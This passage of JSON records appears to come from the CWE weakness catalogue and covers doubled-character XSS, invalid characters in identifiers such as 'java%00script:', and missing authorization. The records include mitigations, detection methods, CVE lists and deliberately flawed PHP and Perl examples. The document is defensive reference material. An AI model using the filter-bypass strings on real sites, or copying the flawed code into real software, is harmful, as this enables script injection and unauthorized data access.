5.12.13, a branch can be mispredicted (e.g., because of type confusion) and consequently an unprivileged BPF program can read arbitrary memory locations via a side-channel attack, aka CID-9183671af6db."}]}
{"ID": "85", "Name": "Doubled Character XSS Manipulations", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The web application does not filter user-controlled input for executable script disguised using doubling of the involved characters.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "79", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "675", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Read Application Data", "Execute Unauthorized Code or Commands"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Resolve all filtered input to absolute or canonical representations before processing."}, {"Phase": ["Implementation"], "Description": "Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended."}, {"MitigationID": "MIT-30.1", "Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "\n\nUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.\n\n\nThe problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.\n"}, {"MitigationID": "MIT-43", "Phase": ["Implementation"], "Description": "With Struts, write all data from form beans with the bean's filter attribute set to true."}, {"MitigationID": "MIT-31", "Phase": ["Implementation"], "Strategy": "Attack Surface Reduction", "Description": "To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.", "Effectiveness": "Defense in Depth"}], "ObservedExamples": [{"Reference": "CVE-2002-2086", "Description": "XSS using \"<script\".", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2086"}, {"Reference": "CVE-2000-0116", "Description": "Encoded \"javascript\" in IMG tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0116"}, {"Reference": "CVE-2001-1157", "Description": "Extra \"<\" in front of SCRIPT tag.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1157"}], "RelatedAttackPatterns": ["245"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "86", "Name": "Improper Neutralization of Invalid Characters in Identifiers in Web Pages", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product does not neutralize or incorrectly neutralizes invalid characters or byte sequences in the middle of tag names, URI schemes, and other identifiers.", "ExtendedDescription": "Some web browsers may remove these sequences, resulting in output that may have unintended control implications. For example, the product may attempt to remove a \"javascript:\" URI scheme, but a \"java%00script:\" URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "79", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "184", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "436", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Read Application Data", "Execute Unauthorized Code or Commands"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-30.1", "Phase": ["Implementation"], "Strategy": "Output Encoding", "Description": "\n\nUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.\n\n\nThe problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.\n"}, {"MitigationID": "MIT-31", "Phase": ["Implementation"], "Strategy": "Attack Surface Reduction", "Description": "To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.", "Effectiveness": "Defense in Depth"}], "ObservedExamples": [{"Reference": "CVE-2004-0595", "Description": "XSS filter doesn't filter null characters before looking for dangerous tags, which are ignored by web browsers. Multiple Interpretation Error (MIE) and validate-before-cleanse.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0595"}], "RelatedAttackPatterns": ["247", "73", "85"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "862", "Name": "Missing Authorization", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action.", "ExtendedDescription": "\n\nAssuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.\n\n\nWhen access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.\n", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "285", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "284", "ViewID": "1340", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Name": "Web Server", "Prevalence": "Often"}, {"Type": "Technology", "Name": "Database Server", "Prevalence": "Often"}], "BackgroundDetails": ["An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: \"No access\", \"Read access\", \"Change access\", and \"Full control\". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object."], "AlternateTerms": [{"Term": "AuthZ", "Description": "\"AuthZ\" is typically used as an abbreviation of \"authorization\" within the web application security community. It is distinct from \"AuthN\" (or, sometimes, \"AuthC\") which is an abbreviation of \"authentication.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "\n\nOMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.\n\n\nAuthorization weaknesses may arise when a single-user application is ported to a multi-user environment.\n"}, {"Phase": "Implementation", "Note": "A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies."}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data", "Read Files or Directories"], "Note": "An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data."}, {"Scope": ["Integrity"], "Impact": ["Modify Application Data", "Modify Files or Directories"], "Note": "An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data."}, {"Scope": ["Access Control"], "Impact": ["Gain Privileges or Assume Identity", "Bypass Protection Mechanism"], "Note": "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."}], "DetectionMethods": [{"DetectionMethodID": "DM-6", "Method": "Automated Static Analysis", "Description": "\n\nAutomated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.\n\n\nGenerally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.\n", "Effectiveness": "Limited"}, {"Method": "Automated Dynamic Analysis", "Description": "Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic."}, {"Method": "Manual Analysis", "Description": "\n\nThis weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.\n\n\nSpecifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.\n", "Effectiveness": "Moderate", "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints."}, {"Method": "Manual Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Automated Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tHost Application Interface Scanner\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)", "Effectiveness": "SOAR Partial"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "SOAR Partial"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "\n\nDivide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.\n\n\nNote that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.\n"}, {"Phase": ["Architecture and Design"], "Description": "Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7]."}, {"MitigationID": "MIT-4.4", "Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].\n"}, {"Phase": ["Architecture and Design"], "Description": "\n\nFor web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.\n\n\nOne way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.\n"}, {"Phase": ["System Configuration", "Installation"], "Description": "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."}], "DemonstrativeExamples": [{"ID": "DX-95", "Entries": [{"IntroText": "This function runs an arbitrary SQL query on a given database, returning the result of the query."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n\tfunction runEmployeeQuery($dbName, $name){\n\t\tmysql_select_db($dbName,$globalDbHandle) or die(\"Could not open Database\".$dbName);\n```\n//Use a prepared statement to avoid CWE-89* \n\t\t$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');\n\t\t$preparedStatement->execute(array(':name' => $name));\n\t\treturn $preparedStatement->fetchAll();}\n\t\n\t */.../* \n\t\n\t$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);"}, {"BodyText": "While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database."}]}, {"ID": "DX-96", "Entries": [{"IntroText": "The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory."}, {"Nature": "Bad", "Language": "Perl", "ExampleCode": "```\n\tsub DisplayPrivateMessage {\n\t\tmy($id) = @_;\n\t\tmy $Message = LookupMessageObject($id);\n\t\tprint \"From: \" . encodeHTML($Message->{from}) . \"<br>\\n\";\n\t\tprint \"Subject: \" . encodeHTML($Message->{subject}) . \"\\n\";\n\t\tprint \"<hr>\\n\";\n\t\tprint \"Body: \" . encodeHTML($Message->{body}) . \"\\n\";\n\t}\n\tmy $q = new CGI;\n```\n# For purposes of this example, assume that CWE-309 and* \n\t\n\t\n\t\n\t *# CWE-523 do not apply.* \n\tif (! AuthenticateUser($q->param('username'), $q->param('password'))) {\n\t```\n\t\tExitError(\"invalid username or password\");\n\t}\n\tmy $id = $q->param('id');\n\tDisplayPrivateMessage($id);\n```"}, {"BodyText": "While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users."}, {"BodyText": "One way to avoid this problem would be to ensure that the \"to\" field in the message object matches the username of the authenticated user."}]}], "ObservedExamples": [{"Reference": "CVE-2022-24730", "Description": "Go-based continuous deployment product does not check that a user has certain privileges to update or create an app, allowing adversaries to read sensitive repository information", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-24730"}, {"Reference": "CVE-2009-3168", "Description": "Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3168"}, {"Reference": "CVE-2009-3597", "Description": "Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3597"}, {"Reference": "CVE-2009-2282", "Description": "Terminal server does not check authorization for guest access.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2282"}, {"Reference": "CVE-2008-5027", "Description": "System monitoring software allows users to bypass authorization by creating custom forms.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5027"}, {"Reference": "CVE-2009-3781", "Description": "Content management system does not check access permissions for private files, allowing others to view those files.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3781"}, {"Reference": "CVE-2008-6548", "Description": "Product does not check the ACL of a page accessed using an \"include\" directive, allowing attackers to read unauthorized files.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6548"}, {"Reference": "CVE-2009-2960", "Description": "Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2960"}, {"Reference": "CVE-2009-3230", "Description": "Database server does not use appropriate privileges for certain sensitive operations.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3230"}, {"Reference": "CVE-2009-2213", "Description": "Gateway uses default \"Allow\" configuration for its authorization settings.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2213"}, {"Reference": "CVE-2009-0034", "Description": "Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0034"}, {"Reference": "CVE-2008-6123", "Description": "Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6123"}, {"Reference": "CVE-2008-7109", "Description": "Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-7109"}, {"Reference": "CVE-2008-3424", "Description": "Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3424"}, {"Reference": "CVE-2005-1036", "Description": "Chain: Bypass of access restrictions due to improper authorization (CWE-862) of a user results from an improperly initialized (CWE-909) I/O permission bitmap", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1036"}, {"Reference": "CVE-2008-4577", "Description": "ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4577"}, {"Reference": "CVE-2007-2925", "Description": "Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2925"}, {"Reference": "CVE-2006-6679", "Description": "Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6679"}, {"Reference": "CVE-2005-3623", "Description": "OS kernel does not check for a certain privilege before setting ACLs for files.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3623"}, {"Reference": "CVE-2005-2801", "Description": "Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2801"}, {"Reference": "CVE-2001-1155", "Description": "Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1155"}, {"Reference": "CVE-2020-17533", "Description": "Chain: unchecked return value (CWE-252) of some functions for policy enforcement leads to authorization bypass (CWE-862)", "Link": "https://www.cve.org/CVERecord?id=CVE-2020-17533"}], "RelatedAttackPatterns": ["665"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-43581", "Description": "IBM Content Navigator 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.0.7, 3.0.8, 3.0.9, 3.0.10, 3.0.11, and 3.0.12 is vulnerable to missing authorization and could allow an authenticated user to load external plugins and execute code. IBM X-Force ID: 238805."}, {"Reference": "CVE-2022-0421", "Description": "The Five Star Restaurant Reservations WordPress plugin before 2.4.12 does not have authorisation when changing whether a payment was successful or failed, allowing unauthenticated users to change the payment status of arbitrary bookings. Furthermore, due to the lack of sanitisation and escaping, attackers could perform Cross-Site Scripting attacks against a logged in admin viewing the failed payments"}, {"Reference": "CVE-2022-0423", "Description": "The 3D FlipBook WordPress plugin before 1.12.1 does not have authorisation and CSRF checks when updating its settings, and does not have any sanitisation/escaping, allowing any authenticated users, such as subscriber to put Cross-Site Scripting payloads in all pages with a 3d flipbook."}, {"Reference": "CVE-2022-0450", "Description": "The Menu Image, Icons made easy WordPress plugin before 3.0.6 does not have authorisation and CSRF checks when saving menu settings, and does not validate, sanitise and escape them. As a result, any authenticate users, such as subscriber can update the settings or arbitrary menu and put Cross-Site Scripting payloads in them which will be triggered in the related menu in the frontend"}, {"Reference": "CVE-2022-0818", "Description": "The WooCommerce Affiliate Plugin WordPress plugin before 4.16.4.5 does not have authorization and CSRF checks on a specific action handler, as well as does not sanitize its settings, which enables an unauthenticated attacker to inject malicious XSS payloads into the settings page of the plugin."}, {"Reference": "CVE-2022-1557", "Description": "The ULeak Security & Monitoring WordPress plugin through 1.2.3 does not have authorisation and CSRF checks when updating its settings, and is also lacking sanitisation as well as escaping in some of them, which could allow any authenticated users such as subscriber to perform Stored Cross-Site Scripting attacks against admins viewing the settings"}, {"Reference": "CVE-2022-20054", "Description": "In ims service, there is a possible AT command injection due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06219083; Issue ID: ALPS06219083."}, {"Reference": "CVE-2022-22735", "Description": "The Simple Quotation WordPress plugin through 1.3.2 does not have authorisation (and CSRF) checks in various of its AJAX actions and is lacking escaping of user data when using it in SQL statements, allowing any authenticated users, such as subscriber to perform SQL injection attacks"}, {"Reference": "CVE-2022-2846", "Description": "The Calendar Event Multi View WordPress plugin before 1.4.07 does not have any authorisation and CSRF checks in place when creating an event, and is also lacking sanitisation as well as escaping in some of the event fields. This could allow unauthenticated attackers to create arbitrary events and put Cross-Site Scripting payloads in it."}, {"Reference": "CVE-2022-3024", "Description": "The Simple Bitcoin Faucets WordPress plugin through 1.7.0 does not have any authorisation and CSRF in an AJAX action, allowing any authenticated users, such as subscribers to call it and add/delete/edit Bonds. Furthermore, due to the lack of sanitisation and escaping, it could also lead to Stored Cross-Site Scripting issues"}, {"Reference": "CVE-2022-4125", "Description": "The Popup Manager WordPress plugin through 1.6.6 does not have authorisation and CSRF check when creating/updating popups, and is missing sanitisation as well as escaping, which could allow unauthenticated attackers to create arbitrary popups and add Stored XSS payloads as well"}, {"Reference": "CVE-2022-47339", "Description": "In cmd services, there is a OS command injection issue due to missing permission check. This could lead to local escalation of privilege with system execution privileges needed."}, {"Reference": "CVE-2022-0164", "Description": "The Coming soon and Maintenance mode WordPress plugin before 3.5.3 does not have authorisation and CSRF checks in its coming_soon_send_mail AJAX action, allowing any authenticated users, with a role as low as subscriber to send arbitrary emails to all subscribed users"}, {"Reference": "CVE-2022-0229", "Description": "The miniOrange's Google Authenticator WordPress plugin before 5.5 does not have proper authorisation and CSRF checks when handling the reconfigureMethod, and does not validate the parameters passed to it properly. As a result, unauthenticated users could delete arbitrary options from the blog, making it unusable."}, {"Reference": "CVE-2022-0345", "Description": "The Customize WordPress Emails and Alerts WordPress plugin before 1.8.7 does not have authorisation and CSRF check in its bnfw_search_users AJAX action, allowing any authenticated users to call it and query for user e-mail prefixes (finding the first letter, then the second one, then the third one etc.)."}, {"Reference": "CVE-2022-0363", "Description": "The myCred WordPress plugin before 2.4.3.1 does not have any authorisation and CSRF checks in the mycred-tools-import-export AJAX action, allowing any authenticated users, such as subscribers, to call it and import mycred setup, thus creating badges, managing points or creating arbitrary posts."}, {"Reference": "CVE-2022-0398", "Description": "The ThirstyAffiliates Affiliate Link Manager WordPress plugin before 3.10.5 does not have authorisation and CSRF checks when creating affiliate links, which could allow any authenticated user, such as subscriber to create arbitrary affiliate links, which could then be used to redirect users to an arbitrary website"}, {"Reference": "CVE-2022-0403", "Description": "The Library File Manager WordPress plugin before 5.2.3 is using an outdated version of the elFinder library, which is know to be affected by security issues (CVE-2021-32682), and does not have any authorisation as well as CSRF checks in its connector AJAX action, allowing any authenticated users, such as subscriber to call it. Furthermore, as the options passed to the elFinder library does not restrict any file type, users with a role as low as subscriber can Create/Upload/Delete Arbitrary files and folders."}, {"Reference": "CVE-2022-0444", "Description": "The Backup, Restore and Migrate WordPress Sites With the XCloner Plugin WordPress plugin before 4.3.6 does not have authorisation and CSRF checks when resetting its settings, allowing unauthenticated attackers to reset them, including generating a new backup encryption key."}, {"Reference": "CVE-2022-0634", "Description": "The ThirstyAffiliates WordPress plugin before 3.10.5 lacks authorization checks in the ta_insert_external_image action, allowing a low-privilege user (with a role as low as Subscriber) to add an image from an external URL to an affiliate link. Further the plugin lacks csrf checks, allowing an attacker to trick a logged in user to perform the action by crafting a special request."}, {"Reference": "CVE-2022-0833", "Description": "The Church Admin WordPress plugin before 3.4.135 does not have authorisation and CSRF in some of its action as well as requested files, allowing unauthenticated attackers to repeatedly request the \"refresh-backup\" action, and simultaneously keep requesting a publicly accessible temporary file generated by the plugin in order to disclose the final backup filename, which can then be fetched by the attacker to download the backup of the plugin's DB data"}, {"Reference": "CVE-2022-0952", "Description": "The Sitemap by click5 WordPress plugin before 1.0.36 does not have authorisation and CSRF checks when updating options via a REST endpoint, and does not ensure that the option to be updated belongs to the plugin. As a result, unauthenticated attackers could change arbitrary blog options, such as the users_can_register and default_role, allowing them to create a new admin account and take over the blog."}, {"Reference": "CVE-2022-1092", "Description": "The myCred WordPress plugin before 2.4.3.1 does not have authorisation and CSRF checks in its mycred-tools-import-export AJAX action, allowing any authenticated user to call and and retrieve the list of email address present in the blog"}, {"Reference": "CVE-2022-1203", "Description": "The Content Mask WordPress plugin before 1.8.4.1 does not have authorisation and CSRF checks in various AJAX actions, as well as does not validate the option to be updated to ensure it belongs to the plugin. As a result, any authenticated user, such as subscriber could modify arbitrary blog options"}, {"Reference": "CVE-2022-1570", "Description": "The Files Download Delay WordPress plugin before 1.0.7 does not have authorisation and CSRF checks when reseting its settings, which could allow any authenticated users, such as subscriber to perform such action."}, {"Reference": "CVE-2022-1572", "Description": "The HTML2WP WordPress plugin through 1.0.0 does not have authorisation and CSRF checks in an AJAX action, available to any authenticated users such as subscriber, which could allow them to delete arbitrary file"}, {"Reference": "CVE-2022-1574", "Description": "The HTML2WP WordPress plugin through 1.0.0 does not have authorisation and CSRF checks when importing files, and does not validate them, as a result, unauthenticated attackers can upload arbitrary files (such as PHP) on the remote server"}, {"Reference": "CVE-2022-2180", "Description": "The GREYD.SUITE WordPress theme does not properly validate uploaded custom font packages, and does not perform any authorization or csrf checks, allowing an unauthenticated attacker to upload arbitrary files including php source files, leading to possible remote code execution (RCE)."}, {"Reference": "CVE-2022-3911", "Description": "The iubenda WordPress plugin before 3.3.3 does does not have authorisation and CSRF in an AJAX action, and does not ensure that the options to be updated belong to the plugin as long as they are arrays. As a result, any authenticated users, such as subscriber can grant themselves any privileges, such as edit_plugins etc"}, {"Reference": "CVE-2022-4102", "Description": "The Royal Elementor Addons WordPress plugin before 1.3.56 does not have authorization and CSRF checks when deleting a template and does not ensure that the post to be deleted is a template. This could allow any authenticated users, such as subscribers, to delete arbitrary posts assuming they know the related slug."}, {"Reference": "CVE-2021-25116", "Description": "The Enqueue Anything WordPress plugin through 1.0.1 does not have authorisation and CSRF checks in the remove_asset AJAX action, and does not ensure that the item to be deleted is actually an asset. As a result, low privilege users such as subscriber could delete arbitrary assets, as well as put arbitrary posts in the trash."}, {"Reference": "CVE-2021-39190", "Description": "The SCCM plugin for GLPI is a plugin to synchronize computers from SCCM (version 1802) to GLPI. In versions prior to 2.3.0, the Configuration page is publicly accessible in read-only mode. This issue is patched in version 2.3.0. No known workarounds exist."}, {"Reference": "CVE-2022-47359", "Description": "In log service, there is a missing permission check. This could lead to local denial of service in log service."}, {"Reference": "CVE-2022-47360", "Description": "In log service, there is a missing permission check. This could lead to local denial of service in log service."}, {"Reference": "CVE-2021-37976", "Description": "Inappropriate implementation in Memory in Google Chrome prior to 94.0.4606.71 allowed a remote attacker to obtain potentially sensitive information from process memory via a crafted HTML page."}, {"Reference": "CVE-2022-0543", "Description": "It was discovered, that redis, a persistent key-value database, due to a packaging issue, is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution."}, {"Reference": "CVE-2021-0735", "Description": "In PackageManager, there is a possible way to get information about installed packages ignoring limitations introduced in Android 11 due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-188913056"}, {"Reference": "CVE-2021-31577", "Description": "In Boa, there is a possible escalation of privilege due to a missing permission check. This could lead to remote escalation of privilege from a proximal 